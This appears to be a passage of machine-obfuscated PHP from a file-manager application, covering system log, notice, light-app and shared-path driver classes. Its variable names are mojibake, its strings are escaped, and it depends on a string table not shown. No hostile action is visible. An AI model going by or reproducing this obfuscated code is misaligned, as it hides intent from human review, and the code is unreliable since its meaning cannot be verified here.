$Óª±àç); return $this->where($×ñÒµí¶)->delete(); } } goto A“ˆ¿ë¦„; FÏƒ¶“•÷É: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\114\151\x67\x68\164\101\160\x70"; public $modelType = "\x53\x79\163\x74\x65\155\117\x70\x74\151\157\x6e"; public $field = array("\156\141\155\145", "\147\162\x6f\165\x70", "\144\145\163\143", "\143\x6f\x6e\x74\145\156\164"); public function listData($Ü—Ûëƒƒ = false, $åÒ¬’áº = "\x6d\x6f\x64\151\x66\171\124\x69\155\x65", $Ä™Šø° = true) { return parent::listData($Ü—Ûëƒƒ, $åÒ¬’áº, $Ä™Šø°); } public function remove($üœ¯²ŞŞ) { $”Î­Ä¬š = $this->findByName($üœ¯²ŞŞ); if (!$”Î­Ä¬š) { return !1; } return parent::remove($”Î­Ä¬š[$_SERVER[¼’ç§¼´][486]]); } public function add($Üİ¤ëÓå) { if ($this->findByName($Üİ¤ëÓå[$_SERVER[¼’ç§¼´][32]])) { return !1; } return parent::insert($Üİ¤ëÓå); } public function update($òû¤Ôµß, $×÷Š”Ö) { $¿ØñŸ‹ü =& $_SERVER[¼’ç§¼´]; $è²²¼Ö = $this->findByName($òû¤Ôµß); $ô‰Á¯‡Ğ = $this->findByName($×÷Š”Ö[$¿ØñŸ‹ü[32]]); if (!$è²²¼Ö || $ô‰Á¯‡Ğ && $ô‰Á¯‡Ğ[$¿ØñŸ‹ü[486]] != $è²²¼Ö[$¿ØñŸ‹ü[486]]) { return !1; } return parent::update($è²²¼Ö[$¿ØñŸ‹ü[486]], $×÷Š”Ö); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\137\154\157\x67"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\124\151\x6d\145", "\x74\151\x6d\145", "\151\156\x73\145\x72\x74", "\146\165\156\143\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¿…Õ‹æá =& $_SERVER[¼’ç§¼´]; return array($¿…Õ‹æá[2355] => LNG($¿…Õ‹æá[2356]), $¿…Õ‹æá[2357] => LNG($¿…Õ‹æá[2358]), $¿…Õ‹æá[1926] => LNG($¿…Õ‹æá[2359]), $¿…Õ‹æá[2360] => LNG($¿…Õ‹æá[2361]), $¿…Õ‹æá[2362] => LNG($¿…Õ‹æá[2363]), $¿…Õ‹æá[2364] => LNG($¿…Õ‹æá[2365]), $¿…Õ‹æá[2366] => LNG($¿…Õ‹æá[2367]), $¿…Õ‹æá[1956] => LNG($¿…Õ‹æá[2367]), $¿…Õ‹æá[1957] => LNG($¿…Õ‹æá[2368]), $¿…Õ‹æá[2369] => LNG($¿…Õ‹æá[2370]), $¿…Õ‹æá[2371] => LNG($¿…Õ‹æá[2372]), $¿…Õ‹æá[2373] => LNG($¿…Õ‹æá[2374]), $¿…Õ‹æá[2375] => LNG($¿…Õ‹æá[2376]), $¿…Õ‹æá[1954] => LNG($¿…Õ‹æá[2377]), $¿…Õ‹æá[2378] => LNG($¿…Õ‹æá[2379]), $¿…Õ‹æá[1961] => LNG($¿…Õ‹æá[2380]), $¿…Õ‹æá[2381] => LNG($¿…Õ‹æá[2382]), $¿…Õ‹æá[2383] => LNG($¿…Õ‹æá[2384]), $¿…Õ‹æá[2385] => LNG($¿…Õ‹æá[2386]), $¿…Õ‹æá[2387] => LNG($¿…Õ‹æá[2388]), $¿…Õ‹æá[1964] => LNG($¿…Õ‹æá[2389]), $¿…Õ‹æá[1965] => LNG($¿…Õ‹æá[2390]), $¿…Õ‹æá[2391] => LNG($¿…Õ‹æá[2392]), $¿…Õ‹æá[2393] => LNG($¿…Õ‹æá[2394]), $¿…Õ‹æá[2395] => LNG($¿…Õ‹æá[2396]), $¿…Õ‹æá[1959] => LNG($¿…Õ‹æá[2397]), $¿…Õ‹æá[2398] => LNG($¿…Õ‹æá[2399]), $¿…Õ‹æá[1958] => LNG($¿…Õ‹æá[2400]), $¿…Õ‹æá[2401] => LNG($¿…Õ‹æá[2402]), $¿…Õ‹æá[2403] => LNG($¿…Õ‹æá[2404]), $¿…Õ‹æá[2405] => LNG($¿…Õ‹æá[2404]), $¿…Õ‹æá[2406] => LNG($¿…Õ‹æá[2407]), $¿…Õ‹æá[2408] => LNG($¿…Õ‹æá[2408]), $¿…Õ‹æá[2409] => LNG($¿…Õ‹æá[1930]), $¿…Õ‹æá[2410] => LNG($¿…Õ‹æá[2411]), $¿…Õ‹æá[2412] => LNG($¿…Õ‹æá[2413]), $¿…Õ‹æá[2414] => LNG($¿…Õ‹æá[2415]), $¿…Õ‹æá[2416] => LNG($¿…Õ‹æá[2417]), $¿…Õ‹æá[2418] => LNG($¿…Õ‹æá[2419]), $¿…Õ‹æá[2420] => LNG($¿…Õ‹æá[2420]), $¿…Õ‹æá[2421] => LNG($¿…Õ‹æá[2422]), $¿…Õ‹æá[2423] => LNG($¿…Õ‹æá[2424]), $¿…Õ‹æá[2425] => LNG($¿…Õ‹æá[2426]), $¿…Õ‹æá[2427] => LNG($¿…Õ‹æá[2428]), $¿…Õ‹æá[2429] => LNG($¿…Õ‹æá[2430]), $¿…Õ‹æá[2431] => LNG($¿…Õ‹æá[2432]), $¿…Õ‹æá[212] => LNG($¿…Õ‹æá[212]), $¿…Õ‹æá[213] => LNG($¿…Õ‹æá[2433]), $¿…Õ‹æá[2434] => LNG($¿…Õ‹æá[2434])); } private function typeFile() { $óİé¥Ä =& $_SERVER[¼’ç§¼´]; $ƒáÛ¬ë¡ = array($óİé¥Ä[1961] => array($óİé¥Ä[1962]), $óİé¥Ä[2373] => array($óİé¥Ä[2435]), $óİé¥Ä[2375] => array($óİé¥Ä[2436]), $óİé¥Ä[1954] => array($óİé¥Ä[1955], $óİé¥Ä[2437]), $óİé¥Ä[2383] => array(), $óİé¥Ä[2385] => array(), $óİé¥Ä[2387] => array(), $óİé¥Ä[1964] => array($óİé¥Ä[1966]), $óİé¥Ä[1965] => array($óİé¥Ä[1966]), $óİé¥Ä[2391] => array($óİé¥Ä[2438]), $óİé¥Ä[2393] => array($óİé¥Ä[2438]), $óİé¥Ä[2395] => array($óİé¥Ä[2439]), $óİé¥Ä[2381] => array($óİé¥Ä[2440]), $óİé¥Ä[1959] => array($óİé¥Ä[2441]), $óİé¥Ä[2398] => array($óİé¥Ä[2442]), $óİé¥Ä[1958] => array($óİé¥Ä[1960])); return $ƒáÛ¬ë¡; } private function typeAll() { $»—ñøµ† =& $_SERVER[¼’ç§¼´]; $Ã§µÊâÉ = $this->typeList; $´×Œ²á = array_filter($this->typeFile()); foreach ($´×Œ²á as $ıì”’‹å => $‚¢ÂŠ§) { $Ã§µÊâÉ[$‚¢ÂŠ§[0]] = $Ã§µÊâÉ[$ıì”’‹å]; } $Ã§µÊâÉ[$»—ñøµ†[1966]] = LNG($»—ñøµ†[2443]); $Ã§µÊâÉ[$»—ñøµ†[2438]] = LNG($»—ñøµ†[2444]); return $Ã§µÊâÉ; } public function addLog($÷Ëò¶ıÆ, $°öü‚à = array()) { $¿ÍƒÎ¯¡ =& $_SERVER[¼’ç§¼´]; if (!isset($this->typeList[$÷Ëò¶ıÆ])) { return; } $Èí§ÍàÕ = Session::get($¿ÍƒÎ¯¡[2125]); if (!$Èí§ÍàÕ) { $Èí§ÍàÕ = _get($°öü‚à, $¿ÍƒÎ¯¡[1783], 0); } if ($÷Ëò¶ıÆ == $¿ÍƒÎ¯¡[2410] && is_array($°öü‚à[$¿ÍƒÎ¯¡[2445]]) && !$°öü‚à[$¿ÍƒÎ¯¡[2445]]) { return; } $ö—„ßÁ‡ = get_client_ip(); if (!$°öü‚à || strlen(json_encode($°öü‚à)) >= 1024 * 64) { if ($°öü‚à && is_array($°öü‚à)) { $°öü‚à = array_intersect_key($°öü‚à, array_flip($¿ÍƒÎ¯¡[486], $¿ÍƒÎ¯¡[32])); $°öü‚à[$¿ÍƒÎ¯¡[2446]] = $ö—„ßÁ‡; } else { $°öü‚à = array($¿ÍƒÎ¯¡[2446] => $ö—„ßÁ‡); } } else { if (is_array($°öü‚à)) { $°öü‚à[$¿ÍƒÎ¯¡[2446]] = $ö—„ßÁ‡; } else { $°öü‚à = array($¿ÍƒÎ¯¡[1296] => $°öü‚à, $¿ÍƒÎ¯¡[2446] => $ö—„ßÁ‡); } } $°öü‚à = array($¿ÍƒÎ¯¡[1773] => Session::sign(), $¿ÍƒÎ¯¡[1774] => intval($Èí§ÍàÕ), $¿ÍƒÎ¯¡[33] => $÷Ëò¶ıÆ, $¿ÍƒÎ¯¡[1776] => json_encode($°öü‚à)); return parent::add($°öü‚à); } public function remove($Úü˜çô) { $this->where(array($_SERVER[¼’ç§¼´][504] => $Úü˜çô))->delete(); } private function _makeOrder($í¯§ ·Ë = '') { $åÔ­º =& $_SERVER[¼’ç§¼´]; $¢‚öº²™ = $åÔ­º[233]; $é¤”ÈçÛ = array($åÔ­º[534] => $åÔ­º[535], $åÔ­º[536] => $åÔ­º[537]); $Çë•û¤­ = Input::get($åÔ­º[542], $åÔ­º[7], $åÔ­º[2162], array($åÔ­º[2079], $åÔ­º[536])); $Çë•û¤­ = $é¤”ÈçÛ[$Çë•û¤­]; $í¯§ ·Ë = $í¯§ ·Ë . "{$¢‚öº²™}\40{$Çë•û¤­}"; return $this->order($í¯§ ·Ë); } public function get($Œ…‰ÎÏ– = '') { $ûŞÂÚ¸Ç =& $_SERVER[¼’ç§¼´]; if (!$Œ…‰ÎÏ–) { show_json(array()); } $ığ÷ ĞÏ = array(); if ($Œ…‰ÎÏ–[$ûŞÂÚ¸Ç[1783]]) { $ığ÷ ĞÏ[$ûŞÂÚ¸Ç[1783]] = $Œ…‰ÎÏ–[$ûŞÂÚ¸Ç[1783]]; } if (isset($Œ…‰ÎÏ–[$ûŞÂÚ¸Ç[848]])) { $›Ê¼êş = $Œ…‰ÎÏ–[$ûŞÂÚ¸Ç[848]]; $Î‡¦åÍ = isset($Œ…‰ÎÏ–[$ûŞÂÚ¸Ç[849]]) ? $Œ…‰ÎÏ–[$ûŞÂÚ¸Ç[849]] : time(); $ığ÷ ĞÏ[$ûŞÂÚ¸Ç[233]] = array($ûŞÂÚ¸Ç[410], array($›Ê¼êş, $Î‡¦åÍ)); } if ($Œ…‰ÎÏ–[$ûŞÂÚ¸Ç[33]]) { $Ì¡™ÉÖ = explode($ûŞÂÚ¸Ç[50], $Œ…‰ÎÏ–[$ûŞÂÚ¸Ç[33]]); $­ÑÆ¥Õ = $this->typeFile(); $ë °¾À¨ = array(); foreach ($Ì¡™ÉÖ as $ÚšÏÑ²) { $ë °¾À¨[] = $ÚšÏÑ²; if (isset($­ÑÆ¥Õ[$ÚšÏÑ²])) { $ë °¾À¨ = array_merge($ë °¾À¨, $­ÑÆ¥Õ[$ÚšÏÑ²]); } } $ë °¾À¨ = array_unique($ë °¾À¨); if ($ë °¾À¨) { $ığ÷ ĞÏ[$ûŞÂÚ¸Ç[33]] = array($ûŞÂÚ¸Ç[7], $ë °¾À¨); } } else { $ığ÷ ĞÏ[$ûŞÂÚ¸Ç[33]] = array($ûŞÂÚ¸Ç[2447], $ûŞÂÚ¸Ç[2448]); } if (!empty($Œ…‰ÎÏ–[$ûŞÂÚ¸Ç[2446]])) { $ığ÷ ĞÏ[$ûŞÂÚ¸Ç[537]] = array($ûŞÂÚ¸Ç[470], "\x25{$Œ…‰ÎÏ–[$ûŞÂÚ¸Ç[2446]]}\x25"); } $ó¯¼Êàç = $this->_makeOrder()->where($ığ÷ ĞÏ)->selectPage(); if (empty($ó¯¼Êàç[$ûŞÂÚ¸Ç[456]])) { show_json(array(), !0, $ó¯¼Êàç[$ûŞÂÚ¸Ç[453]]); } $ó¯¼Êàç[$ûŞÂÚ¸Ç[456]] = $this->logList($ó¯¼Êàç[$ûŞÂÚ¸Ç[456]]); return $ó¯¼Êàç; } private function ipAddress(&$©£ÏğÒà) { $ïßÎûÁ¬ =& $_SERVER[¼’ç§¼´]; if (!empty($©£ÏğÒà[$ïßÎûÁ¬[2446]])) { $Ñ÷‰Àã´ = IpLocation::get($©£ÏğÒà[$ïßÎûÁ¬[2446]]); } else { $Ñ÷‰Àã´ = LNG($ïßÎûÁ¬[2449]); } $©£ÏğÒà[$ïßÎûÁ¬[2450]] = $Ñ÷‰Àã´; } private function descZipDownload($ÔáÃûƒş, &$Ğ›§¸í) { $ ¤§Î =& $_SERVER[¼’ç§¼´]; if (!isset($ÔáÃûƒş[$ ¤§Î[2451]])) { return; } $Ø¦‰äÔ¶ = json_decode($ÔáÃûƒş[$ ¤§Î[2451]], !0); foreach ($Ø¦‰äÔ¶ as $Ïò‹‘É½) { try { $ïšëÙÍ = IO::infoFullSimple($Ïò‹‘É½[$ ¤§Î[87]]); } catch (Exception $…ĞöÚí ) { continue; } $ÔáÃûƒş[$ ¤§Î[87]] = $Ïò‹‘É½[$ ¤§Î[87]]; $Ğ›§¸í[] = $ÔáÃûƒş[$ ¤§Î[193]] = $ïšëÙÍ[$ ¤§Î[193]]; $Ğ›§¸í[] = $ÔáÃûƒş[$ ¤§Î[2218]] = $ïšëÙÍ[$ ¤§Î[192]]; break; } return $ÔáÃûƒş; } private function getSourceList(&$ÆğÍã²ƒ) { $¨«Ç§È‡ =& $_SERVER[¼’ç§¼´]; $–Şâ™´” = array(); foreach ($ÆğÍã²ƒ as $ÓÕ •ÊÓ => $¼×›û¸É) { $ˆúÇ¾“ = json_decode($¼×›û¸É[$¨«Ç§È‡[537]], !0); if ($¼×›û¸É[$¨«Ç§È‡[33]] == $¨«Ç§È‡[1957]) { $ˆúÇ¾“ = $this->descZipDownload($ˆúÇ¾“, $–Şâ™´”); $ÆğÍã²ƒ[$ÓÕ •ÊÓ][$¨«Ç§È‡[537]] = json_encode($ˆúÇ¾“); continue; } if (strpos($¼×›û¸É[$¨«Ç§È‡[33]], $¨«Ç§È‡[2220]) !== 0) { if (!isset($ˆúÇ¾“[$¨«Ç§È‡[87]]) || strpos($¼×›û¸É[$¨«Ç§È‡[33]], $¨«Ç§È‡[2452]) !== 0) { continue; } try { $¸Û÷«È = IO::infoFullSimple($ˆúÇ¾“[$¨«Ç§È‡[87]]); } catch (Exception $ışÅ¬±’) { continue; } $–Şâ™´”[] = $ˆúÇ¾“[$¨«Ç§È‡[193]] = $¸Û÷«È[$¨«Ç§È‡[193]]; $–Şâ™´”[] = $ˆúÇ¾“[$¨«Ç§È‡[2218]] = $¸Û÷«È[$¨«Ç§È‡[192]]; $ÆğÍã²ƒ[$ÓÕ •ÊÓ][$¨«Ç§È‡[537]] = json_encode($ˆúÇ¾“); continue; } $–Şâ™´”[] = $ˆúÇ¾“[$¨«Ç§È‡[193]]; $–Şâ™´”[] = $ˆúÇ¾“[$¨«Ç§È‡[2218]]; if ($ˆúÇ¾“[$¨«Ç§È‡[33]] == $¨«Ç§È‡[634]) { $–Şâ™´”[] = $ˆúÇ¾“[$¨«Ç§È‡[537]][$¨«Ç§È‡[1250]]; $–Şâ™´”[] = $ˆúÇ¾“[$¨«Ç§È‡[537]][$¨«Ç§È‡[1251]]; } if ($ˆúÇ¾“[$¨«Ç§È‡[33]] == $¨«Ç§È‡[2229]) { $–Şâ™´”[] = $ˆúÇ¾“[$¨«Ç§È‡[537]][$¨«Ç§È‡[193]]; } } if (!$–Şâ™´”) { return array(); } return Model($¨«Ç§È‡[913])->sourceListInfo($–Şâ™´”, !0); } private function logList($ÌÇ±°) { $¿¯•ô»Ã =& $_SERVER[¼’ç§¼´]; $‡Ê™á¢Š = array_to_keyvalue($ÌÇ±°, $¿¯•ô»Ã[12], $¿¯•ô»Ã[1783]); $Á˜åá·” = Model($¿¯•ô»Ã[608])->userListInfo(array_unique($‡Ê™á¢Š)); $öÁ¨¿º° = $this->getSourceList($ÌÇ±°); $Ò­ª†øœ = $this->typeAll(); $¦ğªó¥Ì = array(); $´¨öº¶ = array(); foreach ($ÌÇ±° as $¥ËëÃ¸Ï => $¯Èæ¦˜æ) { $£ó¶àè´ = $¯Èæ¦˜æ[$¿¯•ô»Ã[33]]; $‚¼À¡Ø± = isset($Á˜åá·”[$¯Èæ¦˜æ[$¿¯•ô»Ã[1783]]]) ? $Á˜åá·”[$¯Èæ¦˜æ[$¿¯•ô»Ã[1783]]] : !1; $‹Üªß¤û = strpos($£ó¶àè´, $¿¯•ô»Ã[2453]) === 0 ? LNG($¿¯•ô»Ã[2454]) : LNG($¿¯•ô»Ã[2449]); $¯Èæ¦˜æ[$¿¯•ô»Ã[32]] = isset($‚¼À¡Ø±[$¿¯•ô»Ã[32]]) ? $‚¼À¡Ø±[$¿¯•ô»Ã[32]] : LNG($¿¯•ô»Ã[2449]); $¯Èæ¦˜æ[$¿¯•ô»Ã[2279]] = isset($‚¼À¡Ø±[$¿¯•ô»Ã[2279]]) ? $‚¼À¡Ø±[$¿¯•ô»Ã[2279]] : $¿¯•ô»Ã[12]; $¯Èæ¦˜æ[$¿¯•ô»Ã[1671]] = isset($Ò­ª†øœ[$£ó¶àè´]) ? $Ò­ª†øœ[$£ó¶àè´] : $‹Üªß¤û; $¯Èæ¦˜æ[$¿¯•ô»Ã[2161]] = $‚¼À¡Ø±; $èÜàåÌ = json_decode($¯Èæ¦˜æ[$¿¯•ô»Ã[537]], !0); $¯Èæ¦˜æ[$¿¯•ô»Ã[2446]] = isset($èÜàåÌ[$¿¯•ô»Ã[2446]]) ? $èÜàåÌ[$¿¯•ô»Ã[2446]] : $¿¯•ô»Ã[12]; $¯Èæ¦˜æ[$¿¯•ô»Ã[2450]] = IpLocation::get($¯Èæ¦˜æ[$¿¯•ô»Ã[2446]]); if (strpos($£ó¶àè´, $¿¯•ô»Ã[2220]) === 0 || isset($èÜàåÌ[$¿¯•ô»Ã[2218]])) { $èÜàåÌ[$¿¯•ô»Ã[90]] = $öÁ¨¿º°[$èÜàåÌ[$¿¯•ô»Ã[193]]]; $èÜàåÌ[$¿¯•ô»Ã[2234]] = $öÁ¨¿º°[$èÜàåÌ[$¿¯•ô»Ã[2218]]]; if ($èÜàåÌ[$¿¯•ô»Ã[33]] == $¿¯•ô»Ã[634]) { $èÜàåÌ[$¿¯•ô»Ã[537]][$¿¯•ô»Ã[1250]] = $öÁ¨¿º°[$èÜàåÌ[$¿¯•ô»Ã[537]][$¿¯•ô»Ã[1250]]]; $èÜàåÌ[$¿¯•ô»Ã[537]][$¿¯•ô»Ã[1251]] = $öÁ¨¿º°[$èÜàåÌ[$¿¯•ô»Ã[537]][$¿¯•ô»Ã[1251]]]; } if ($èÜàåÌ[$¿¯•ô»Ã[33]] == $¿¯•ô»Ã[2229]) { $èÜàåÌ[$¿¯•ô»Ã[537]][$¿¯•ô»Ã[193]] = $öÁ¨¿º°[$èÜàåÌ[$¿¯•ô»Ã[537]][$¿¯•ô»Ã[193]]]; } if ($èÜàåÌ[$¿¯•ô»Ã[33]] == $¿¯•ô»Ã[1952]) { $èÜàåÌ[$¿¯•ô»Ã[2234]] = $èÜàåÌ[$¿¯•ô»Ã[90]]; $èÜàåÌ[$¿¯•ô»Ã[2218]] = $èÜàåÌ[$¿¯•ô»Ã[2234]][$¿¯•ô»Ã[193]]; $èÜàåÌ[$¿¯•ô»Ã[90]] = !1; $èÜàåÌ[$¿¯•ô»Ã[193]] = $¿¯•ô»Ã[12]; } $ì©ââ™° = array($¿¯•ô»Ã[1952], $¿¯•ô»Ã[2216]); if (!in_array($èÜàåÌ[$¿¯•ô»Ã[33]], $ì©ââ™°)) { if ($èÜàåÌ[$¿¯•ô»Ã[90]] && $èÜàåÌ[$¿¯•ô»Ã[90]][$¿¯•ô»Ã[190]] == $¿¯•ô»Ã[191]) { $´¨öº¶[] = $¯Èæ¦˜æ[$¿¯•ô»Ã[486]]; unset($ÌÇ±°[$¥ËëÃ¸Ï]); continue; } if ($èÜàåÌ[$¿¯•ô»Ã[2234]] && $èÜàåÌ[$¿¯•ô»Ã[2234]][$¿¯•ô»Ã[190]] == $¿¯•ô»Ã[191]) { $´¨öº¶[] = $¯Èæ¦˜æ[$¿¯•ô»Ã[486]]; unset($ÌÇ±°[$¥ËëÃ¸Ï]); continue; } } } $¯Èæ¦˜æ[$¿¯•ô»Ã[537]] = $èÜàåÌ; unset($¯Èæ¦˜æ[$¿¯•ô»Ã[2455]]); $¦ğªó¥Ì[] = $¯Èæ¦˜æ; } $this->clearSystemPathLog($´¨öº¶); return $¦ğªó¥Ì; } private function clearSystemPathLog($‚¹òñ—ù) { $ÕÌµ½•‘ =& $_SERVER[¼’ç§¼´]; if (count($‚¹òñ—ù) == 0) { return; } $ú ‡ó±© = array($ÕÌµ½•‘[486] => array($ÕÌµ½•‘[7], array_unique($‚¹òñ—ù))); $this->where($ú ‡ó±©)->delete(); } public function deviceList($°«æÌœô, $Øç«àúé = 0) { $©ƒØØùâ =& $_SERVER[¼’ç§¼´]; $Î÷­åÄµ = array($©ƒØØùâ[1783] => $°«æÌœô, $©ƒØØùâ[233] => array($©ƒØØùâ[1100], $Øç«àúé), $©ƒØØùâ[33] => $©ƒØØùâ[1926]); $¸…ùô¸æ = array(); $Ë³‡»ÈÂ = $this->field($©ƒØØùâ[2456])->where($Î÷­åÄµ)->order($©ƒØØùâ[2232])->limit(50)->select(); foreach ($Ë³‡»ÈÂ as $éõ³«ÂØ => $Éë•ä¡») { if ($éõ³«ÂØ > 0 && abs($Éë•ä¡»[$©ƒØØùâ[233]] - $Ë³‡»ÈÂ[$éõ³«ÂØ - 1][$©ƒØØùâ[233]]) < 5) { continue; } $±ÜÂ‰Úˆ = json_decode($Éë•ä¡»[$©ƒØØùâ[537]], !0); $Éë•ä¡»[$©ƒØØùâ[2446]] = isset($±ÜÂ‰Úˆ[$©ƒØØùâ[2446]]) ? $±ÜÂ‰Úˆ[$©ƒØØùâ[2446]] : $©ƒØØùâ[12]; unset($±ÜÂ‰Úˆ[$©ƒØØùâ[2446]]); $©õùÚòï = $this->deviceType($±ÜÂ‰Úˆ[$©ƒØØùâ[2221]]); if (isset($¸…ùô¸æ[$©õùÚòï])) { continue; } $Éë•ä¡»[$©ƒØØùâ[2450]] = IpLocation::get($Éë•ä¡»[$©ƒØØùâ[2446]]); $Éë•ä¡»[$©ƒØØùâ[537]] = $±ÜÂ‰Úˆ; $¸…ùô¸æ[$©õùÚòï] = $Éë•ä¡»; } return array_values($¸…ùô¸æ); } public function deviceType($ùôä§üŸ) { return $ùôä§üŸ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\x2e\x6e\x6f\164\151\143\x65\114\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\143\x6f\x6e\x74\145\156\164", "\141\165\x74\x68", "\155\x6f\x64\x65", "\x74\x69\x6d\145", "\x74\171\x70\145", "\154\x65\x76\x65\x6c", "\x65\156\x61\142\154\145", "\163\x6f\162\x74"); public function listData($«¥ãçòÎ = false, $ë™ïº¸ = "\x73\x6f\x72\164", $–¼ÊÁŞ = false) { return parent::listData($«¥ãçòÎ, $ë™ïº¸, $–¼ÊÁŞ); } public function add($ıé°¹ß‚) { $ö†±·ûÙ =& $_SERVER[¼’ç§¼´]; $ßéÊ‚² = time(); if ($ıé°¹ß‚[$ö†±·ûÙ[16]] == $ö†±·ûÙ[2457]) { $ßéÊ‚² = strtotime($ıé°¹ß‚[$ö†±·ûÙ[206]]); } $ıé°¹ß‚[$ö†±·ûÙ[206]] = $ßéÊ‚²; return parent::insert($ıé°¹ß‚); } public function update($â¤¨«§û, $ã¼ÓúºÀ) { $ø‰Ë†È =& $_SERVER[¼’ç§¼´]; $ş‘‡ôÎ‘ = $this->listData($â¤¨«§û); if (!$ş‘‡ôÎ‘) { return !1; } $èŸ†¨á = time(); if ($ã¼ÓúºÀ[$ø‰Ë†È[16]] == $ø‰Ë†È[2457]) { $èŸ†¨á = strtotime($ã¼ÓúºÀ[$ø‰Ë†È[206]]); } $ã¼ÓúºÀ[$ø‰Ë†È[206]] = $èŸ†¨á; return parent::update($â¤¨«§û, $ã¼ÓúºÀ); } public function remove($’ÛëÕù‡) { $Öõ›ÃŠü = $this->listData($’ÛëÕù‡); if (!$Öõ›ÃŠü || $Öõ›ÃŠü[$_SERVER[¼’ç§¼´][191]]) { return !1; } return parent::remove($’ÛëÕù‡); } public function sort($”Ó¥ÑÛ¢, $¦œıà¸ç) { return parent::update($”Ó¥ÑÛ¢, $¦œıà¸ç); } public function enable($­»İÈ¦™, $á†Æ×å) { return parent::update($­»İÈ¦™, array($_SERVER[¼’ç§¼´][2458] => $á†Æ×å)); } private function initUserOption() { $–¬Ä†Ñ‰ =& $_SERVER[¼’ç§¼´]; $this->optionType = $–¬Ä†Ñ‰[2459]; $this->modelType = $–¬Ä†Ñ‰[2460]; $this->field = array($–¬Ä†Ñ‰[2461], $–¬Ä†Ñ‰[32], $–¬Ä†Ñ‰[206], $–¬Ä†Ñ‰[33], $–¬Ä†Ñ‰[2462], $–¬Ä†Ñ‰[838], $–¬Ä†Ñ‰[228]); } public function userNoticeGet($½ßÉË²Ä = false) { $this->initUserOption(); return parent::listData($½ßÉË²Ä, $_SERVER[¼’ç§¼´][486], !0); } public function userNoticeAdd($Ö‚Å¥í) { $óœ¼ŠÜÊ =& $_SERVER[¼’ç§¼´]; $this->initUserOption(); $”¯Æµüø = $this->findByKey($óœ¼ŠÜÊ[2461], $Ö‚Å¥í[$óœ¼ŠÜÊ[486]]); if ($”¯Æµüø) { return !0; } $Ì¸ê¡’Ø = array($óœ¼ŠÜÊ[2461] => $Ö‚Å¥í[$óœ¼ŠÜÊ[486]], $óœ¼ŠÜÊ[32] => $Ö‚Å¥í[$óœ¼ŠÜÊ[32]], $óœ¼ŠÜÊ[206] => $Ö‚Å¥í[$óœ¼ŠÜÊ[206]], $óœ¼ŠÜÊ[33] => isset($Ö‚Å¥í[$óœ¼ŠÜÊ[33]]) ? $Ö‚Å¥í[$óœ¼ŠÜÊ[33]] : 1, $óœ¼ŠÜÊ[2462] => isset($Ö‚Å¥í[$óœ¼ŠÜÊ[2462]]) ? $Ö‚Å¥í[$óœ¼ŠÜÊ[2462]] : 0, $óœ¼ŠÜÊ[838] => 0, $óœ¼ŠÜÊ[228] => 0); return parent::insert($Ì¸ê¡’Ø); } public function userNoticeEdit($Ú¡Ò£Êæ, $İÌ“şÉ¯) { $this->initUserOption(); return parent::update($Ú¡Ò£Êæ, $İÌ“şÉ¯); } } goto dØ¼„³‹©¹; D‰µ¨Õì±ã: class PathDriverDriverShareItem { public function __construct($Ÿ½Ü›ªŞ) { $this->pathParse = $Ÿ½Ü›ªŞ; } public function __call($¤Å¯‚ã, $ƒã³ÒÀª) { $ÕŒ·å‰ï =& $_SERVER[¼’ç§¼´]; if (method_exists($this, $¤Å¯‚ã)) { return; } $‡´Ñ¾Õâ = call_user_func_array(array($ÕŒ·å‰ï[1439], $¤Å¯‚ã), $ƒã³ÒÀª); $áë¬¶˜ø = array($ÕŒ·å‰ï[1440], $ÕŒ·å‰ï[1441], $ÕŒ·å‰ï[1442], $ÕŒ·å‰ï[1443], $ÕŒ·å‰ï[632], $ÕŒ·å‰ï[634], $ÕŒ·å‰ï[1444], $ÕŒ·å‰ï[110], $ÕŒ·å‰ï[1445], $ÕŒ·å‰ï[1446]); if (in_array($¤Å¯‚ã, $áë¬¶˜ø)) { $‡´Ñ¾Õâ = $this->getPathOuter($‡´Ñ¾Õâ); } return $‡´Ñ¾Õâ; } public function copy($ÓšŠ‡İ, $ìà¬Şş–, $å—¡”€² = false, $ì¯Ã˜Ô© = false) { return $this->copyMove($ÓšŠ‡İ, $ìà¬Şş–, $å—¡”€², $_SERVER[¼’ç§¼´][632], $ì¯Ã˜Ô©); } public function move($¼Æ‚Ñó, $€ğõó©ä, $©‹ù×úÄ = false, $ıä“§‹Æ = false) { return $this->copyMove($¼Æ‚Ñó, $€ğõó©ä, $©‹ù×úÄ, $_SERVER[¼’ç§¼´][634], $ıä“§‹Æ); } private function copyMove($—Ö¶ğ€, $”ñ“ï¡¾, $¦†ú·İ, $è¤Äî­Â, $Õª’ñ¢” = false) { $‹ˆùŒ«è =& $_SERVER[¼’ç§¼´]; $èØ ÁêÁ = $”ñ“ï¡¾; $âºşìŞ¿ = IO::driverMake($”ñ“ï¡¾); if ($âºşìŞ¿->pathParse[$‹ˆùŒ«è[1241]]) { $”ñ“ï¡¾ = $âºşìŞ¿->pathParse[$‹ˆùŒ«è[1241]]; } else { $”ñ“ï¡¾ = $èØ ÁêÁ; } $³‚÷Úçş = IO::copyMove($—Ö¶ğ€, $”ñ“ï¡¾, $¦†ú·İ, $è¤Äî­Â, $Õª’ñ¢”); $³‚÷Úçş = $this->getPathOuter($³‚÷Úçş); return $³‚÷Úçş; } public function pathThis($îÇíÓ¶¨) { return get_path_this($this->pathParse[$_SERVER[¼’ç§¼´][87]]); } public function pathFather($Ñ¿¡¯¦) { return get_path_father($this->pathParse[$_SERVER[¼’ç§¼´][87]]); } public function iconvSystem($ØøşÖŒÓ) { return $ØøşÖŒÓ; } protected function infoParse($Ü‡Šü½ , $‹ôÛÛßæ = false) { $‘ÛüŸÇÍ =& $_SERVER[¼’ç§¼´]; $ö·œ”í˜ = $this->pathParse[$‘ÛüŸÇÍ[571]][$‘ÛüŸÇÍ[1266]] . $this->pathParse[$‘ÛüŸÇÍ[1259]]; if ($‹ôÛÛßæ) { $¬¦¸¬À = IO::infoWithChildren($ö·œ”í˜); } else { $¬¦¸¬À = IO::info($ö·œ”í˜); } $Œˆíøš¡ = $this->pathParse[$‘ÛüŸÇÍ[571]]; return Action($‘ÛüŸÇÍ[1437])->_shareItemeParse($¬¦¸¬À, $Œˆíøš¡); } public function listAll($”åçàæ©) { 